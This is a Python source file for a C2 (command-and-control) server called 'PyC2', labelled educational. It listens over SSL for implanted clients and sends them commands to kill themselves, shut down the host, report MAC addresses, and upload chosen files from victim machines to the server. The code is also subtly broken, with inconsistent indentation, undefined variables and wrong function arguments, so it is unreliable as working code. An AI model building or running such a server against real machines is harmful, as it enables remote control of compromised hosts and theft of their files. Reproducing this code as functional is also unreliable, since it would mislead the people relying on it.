# PyC2 - Python C2 Client/Server Framework
# Created for educational purposes only.

import socket
import ssl
from datetime import datetime
import threading

host = ""
l_port = 443
CERT_PATH = "localhost.pem"

conns = {}

# Sends commands to specified clients
def commands():
    global conns
    print("Commands:\nkill: kills C2 client\nshutdown: shutdown client host\nreport: report MAC address\nupload <path>: upload file to C2 server from specified path\nexit: exit command prompt")
    cmd = raw_input(">")
    
    print("Select which client(s) to send commands to (type 'all' to send commands to all clients):")
    count = 0
    for conn in conns:
        print("%s.) Client: %s | Last check-in: %s" % (str(count),conn,conns[conn][time]))
        count+=1
    targets = raw_input(">")
    if cmd == "exit":
        return 0
    elif cmd == "kill":
        if targets == "all":
            for c in conns:
                c[conn].sendall(bytes("kill","utf-8"))
                reply = c.recv(4098).decode("utf-8")
                print(reply)
        else:
            c = conns[int(targets)][conn]
            c.sendall(bytes("kill","utf-8"))
            reply = c.recv(4098).decode("utf-8")
            print(reply)
    elif cmd == "shutdown":
        if targets == "all":
            for c in conns:
                c[conn].sendall(bytes("shutdown","utf-8"))
                reply = c.recv(4098).decode("utf-8")
                print(reply)
        else:
            c = conns[int(targets)][conn]
            c.sendall(bytes("shutdown","utf-8"))
            reply = c.recv(4098).decode("utf-8")
            print(reply)
    elif cmd == "report":
        if targets == "all":
            for c in conns:
                c[conn].sendall(bytes("report","utf-8"))
                reply = c.recv(4098).decode("utf-8")
                print(reply)
        else:
            c = conns[int(targets)][conn]
            c.sendall(bytes("report","utf-8"))
            reply = c.recv(4098).decode("utf-8")
            print(reply)
    elif "upload" in cmd:
        if targets == "all":
            for c in conns:
                c[conn].sendall(bytes(cmd,"utf-8"))
                reply = c.recv(64000).decode("utf-8")
                if reply:
                    n = datetime.now()
                    with open("%s-%s.upload" % (c,n),'wb') as f:
                        f.write(reply)
                    ("Data written to '%s-%s.upload'..." % (c,n))
        else:
            c = conns[int(targets)][conn]
            c.sendall(bytes(cmd,"utf-8"))
            reply = c.recv(64000).decode("utf-8")
                if reply:
                    n = datetime.now()
                    with open("%s-%s.upload" % (c,n),'wb') as f:
                        f.write(reply)
                    ("Data written to '%s-%s.upload'..." % (c,n))


# Lists active clients
def clients():
    global conns
    counter = 0
    if conns:
        for conn in conns:
            print("Client: %s | Last check-in: %s" % (conn,conns[conn][time]))
    else:
        print(bcolors.FAIL,"\nNo current connections.")

# Establishes listener on specified port and enables SSL
def listener(host, port, cert):
    global conns
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(cert)
	s=socket.socket()
	s.bind((host,port))
	s.listen(1)
	s_enc=ssl.wrap_socket(s, server_side=True)

	while True:
		c, addr = s_enc.accept()
        cid = ''
        if c:
            cid = c.recv(4098).decode("utf-8")
            if cid:
                print(bcolors.OKGREEN,"\nClient Online:{}".format(cid))
            else:
                print(bcolors.OKCYAN,"\nNew Client:{}".format(cid))
                conns[cid][time]=datetime.now()
                conns[cid][conn]=c


def main():
    print("Starting listener...")
    listen_thread = threading.Thread(target=listener, args=(host, l_port, key, cert))
    listen_thread.start()
    print("Listener started.")
    print("Command options:\nlist: list clients\nrun: run commands")
    while True:
        cmd = raw_input(">")
        if cmd == "list":
            t = threading.Thread(target=clients)
            t.start()
            t.join()
        elif cmd == "run":
            t = threading.Thread(target=commands)
            t.start()
            t.join()
        else:
            pass

main()
